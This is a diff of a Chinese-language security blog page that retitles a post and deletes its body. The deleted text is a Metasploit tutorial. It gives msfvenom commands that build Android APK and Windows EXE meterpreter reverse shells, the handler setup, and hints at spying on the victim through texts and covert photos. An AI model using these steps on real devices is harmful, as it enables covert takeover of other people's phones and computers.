@@ -10,7 +10,7 @@
     
     
     
-    <title>MSF上线 | EternalGemini</title>
+    <title>CS上线 | EternalGemini</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,7 +161,7 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">MSF上线</h1>
+    <h1 class="title">CS上线</h1>
     
     <div class="cube-article-header">
         <div class="cube-article-date">
@@ -177,79 +177,12 @@
     
     <div class="cube-article-content cube-markdown">
         
-        <p>做了两个关于MSF上线的小实验，一个关于安卓手机，另一个关于windows操作系统。(同一个局域网下)</p>
-<span id="more"></span>
-
-<p>一、安卓手机MSF上线</p>
-<p>1.打开kali，在命令窗口中输入 ifconfig 查看kali的ip地址</p>
-<img src="/p/undefined/1.png" class="">
-
-<p>2.接着输入命令  </p>
-<p>msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.108 lport=5555 &gt; 1.apk</p>
-<p>（这里lhost是kali的ip地址，lport自己选择，1.apk也是可以自己取名的）</p>
-<img src="/p/undefined/2.png" class="">
-
-<p>可以在root文件夹中看到生成了一个1.apk文件</p>
-<img src="/p/undefined/3.png" class="">
-
-<p>3.启用msf工具，输入msfconsole</p>
-<img src="/p/undefined/4.png" class="">
-
-<p>4.选择攻击模块 输入命令 use exploit/multi/handler</p>
-<img src="/p/undefined/5.png" class="">
-
-<p>设置攻击载荷反向tcp链接，lhost和lport</p>
-<p>set payload android/meterpreter/reverse_tcp</p>
-<p>set LHOST 1921.168.0.108</p>
-<p>set lport 5555</p>
-<p>执行攻击 run</p>
-<img src="/p/undefined/6.png" class="">
-
-<p>5.将1.apk文件发送到手机上并安装（我使用的是oppo A5，新的手机可能实现不了）</p>
-<p>安装之后点击一下，然后就可以看到kali已经成功入侵了手机啦</p>
-<img src="/p/undefined/7.png" class="">
-
-<img src="/p/undefined/8.png" class="">
-
-<p>6.又是渗透后的利用，可以发短信，偷拍等，自行发挥吧</p>
-<img src="/p/undefined/9.png" class="">
-
-
-
-<p>二、windows操作系统MSF上线</p>
-<p>1.查看kali的ip ifconfig（我上面的ip是192.168.0.108，接着使用一下）</p>
-<p>2.生成 .exe后门文件</p>
-<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=6060 -f exe &gt; 谁用谁牛逼.exe</p>
-<img src="/p/undefined/10.png" class="">
-
-<p>3.启用msf工具，输入msfconsole</p>
-<p>4.选择攻击模块 输入命令 use exploit/multi/handler</p>
-<p>设置攻击载荷反向tcp链接，lhost和lport</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.0.108</p>
-<p>set LPORT 6060</p>
-<p>执行攻击 run（和上面的步骤差不多，注意把android改成windows）</p>
-<img src="/p/undefined/11.png" class="">
-
-<p>5.在靶机上双击后门文件，kali中显示上线了</p>
-<img src="/p/undefined/12.png" class="">
-
-<img src="/p/undefined/14.png" class="">
-
-<p>6.渗透后利用。。。自己琢磨吧，为所欲为。</p>
-
+        
     </div>
 </div>
 
 <div class="cube-article-nav">
     <ul>
-        
-        <li class="prev">
-            <a href="/p/undefined.html">
-                <i class="cube-icon cube-prev" aria-hidden="true"></i>
-                CS上线
-            </a>
-        </li>
         
         
         <li class="next">
@@ -304,7 +237,7 @@
     
     
     <div class="count">
-        <a class="count articles"><span>3</span>Article</a>
+        <a class="count articles"><span>2</span>Article</a>
         <a class="count tags"><span>1</span>Tags</a>
         <a class="count categories"><span>0</span>Categories</a>
     </div>
@@ -355,19 +288,6 @@
             <div class="normal">
                 <p class="index">
                     <span>2</span>
-                </p>
-                <p class="title">
-                    <a href="/p/undefined.html" title="MSF上线">MSF上线</a>
-                </p>
-            </div>
-        </li>
-        
-        
-        
-        <li>
-            <div class="normal">
-                <p class="index">
-                    <span>3</span>
                 </p>
                 <p class="title">
                     <a href="/p/8f17ee8c.html" title="MS17-010">MS17-010</a>
